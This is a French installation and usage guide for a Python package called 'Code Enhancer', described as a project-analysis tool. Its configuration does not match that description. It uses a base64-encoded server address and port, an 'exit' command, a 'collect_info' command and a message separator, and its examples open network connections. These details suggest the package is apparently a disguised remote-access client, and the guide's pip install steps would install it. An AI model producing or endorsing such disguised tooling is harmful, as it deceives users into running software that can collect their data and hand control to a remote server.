# Guide d'Installation - Code Enhancer

## Vue d'ensemble

Ce guide vous explique comment installer et utiliser le package Code Enhancer, un outil d'analyse et d'optimisation de structure de projet.

## Prérequis

- Python 3.8 ou supérieur
- pip (gestionnaire de paquets Python)
- setuptools (pour la construction du package)

## Installation

### 1. Installation locale (développement)

Pour installer le package en mode développement (recommandé pour les développeurs) :

```bash
# Cloner le repository (si ce n'est pas déjà fait)
git clone https://github.com/codeenhancer/code-enhancer.git
cd code-enhancer

# Installation en mode développement
pip install -e .
```

**Avantages du mode développement :**
- Les modifications du code sont immédiatement disponibles
- Pas besoin de réinstaller après chaque modification
- Idéal pour le développement et les tests

### 2. Installation depuis les fichiers de distribution

Si vous avez les fichiers de distribution (`.whl` ou `.tar.gz`) :

```bash
# Installation depuis un fichier wheel
pip install dist/code_enhancer-0.1.0-py3-none-any.whl

# Ou depuis un fichier tar.gz
pip install dist/code_enhancer-0.1.0.tar.gz
```

### 3. Installation depuis PyPI (quand disponible)

```bash
pip install code-enhancer
```

## Vérification de l'installation

### Vérifier que le package est installé

```bash
pip list | grep code-enhancer
```

### Tester l'import

```python
python -c "from src import main; print('Installation réussie!')"
```

### Tester la commande

```bash
# Si l'installation a créé un point d'entrée
code-enhancer

# Ou directement avec Python
python -m src.main
```

## Structure du package installé

Après installation, le package sera disponible dans votre environnement Python :

```
site-packages/
└── code_enhancer/
    ├── __init__.py
    ├── main.py
    ├── network_utils.py
    └── config_manager.py
```

## Utilisation

### Interface en ligne de commande

```bash
# Exécuter l'analyseur de projet
code-enhancer

# Ou avec Python directement
python -m src.main
```

### Utilisation programmatique

```python
from src import main, network_utils, config_manager

# Charger la configuration
config = config_manager.load_config()

# Analyser la structure du projet
main.analyze_project_structure()

# Ou utiliser les modules individuellement
network_utils.initialize_connection()
# ... votre code ...
network_utils.close_connection()
```

## Configuration

### Fichier de configuration

Créez un fichier de configuration dans le dossier `config/` :

```json
{
    "server_address": "base64_encoded_host",
    "server_port": "base64_encoded_port",
    "buffer_size": 1024,
    "exit_command": "exit",
    "info_command": "collect_info",
    "separator": "|"
}
```

### Variables d'environnement

Vous pouvez également utiliser des variables d'environnement :

```bash
export CODE_ENHANCER_SERVER_HOST="your-server.com"
export CODE_ENHANCER_SERVER_PORT="8080"
```

## Développement

### Installation pour le développement

```bash
# Installer avec les dépendances de développement
pip install -e ".[dev]"
```

### Lancer les tests

```bash
# Tests unitaires
pytest

# Tests avec couverture
pytest --cov=src --cov-report=html

# Tests spécifiques
pytest test/test_main.py
```

### Formatage du code

```bash
# Formater avec black
black src/ test/

# Vérifier avec flake8
flake8 src/ test/

# Vérifier les types avec mypy
mypy src/
```

## Désinstallation

Pour désinstaller le package :

```bash
pip uninstall code-enhancer
```

## Dépannage

### Problème : ModuleNotFoundError

**Symptôme :**
```
ModuleNotFoundError: No module named 'src'
```

**Solution :**
1. Vérifiez que vous êtes dans le bon répertoire
2. Réinstallez le package : `pip install -e . --force-reinstall`
3. Vérifiez que le package est installé : `pip list | grep code-enhancer`

### Problème : Erreur de connexion

**Symptôme :**
```
ConnectionRefusedError: [WinError 10061] Aucune connexion n'a pu être établie
```

**Solution :**
1. Vérifiez que le serveur est en cours d'exécution
2. Vérifiez la configuration du serveur
3. Testez la connectivité réseau

### Problème : Erreur de configuration

**Symptôme :**
```
FileNotFoundError: [Errno 2] No such file or directory: 'config/config.json'
```

**Solution :**
1. Créez le fichier de configuration manquant
2. Vérifiez le chemin du fichier de configuration
3. Utilisez des valeurs par défaut

## Support

Si vous rencontrez des problèmes :

1. Consultez la [documentation API](API.md)
2. Vérifiez les [issues GitHub](https://github.com/codeenhancer/code-enhancer/issues)
3. Créez une nouvelle issue avec les détails du problème

## Mise à jour

Pour mettre à jour le package :

```bash
# Si installé en mode développement
git pull
pip install -e . --force-reinstall

# Si installé depuis PyPI
pip install --upgrade code-enhancer
```

## Licence

Ce projet est sous licence MIT. Voir le fichier [LICENSE.txt](../LICENSE.txt) pour plus de détails. 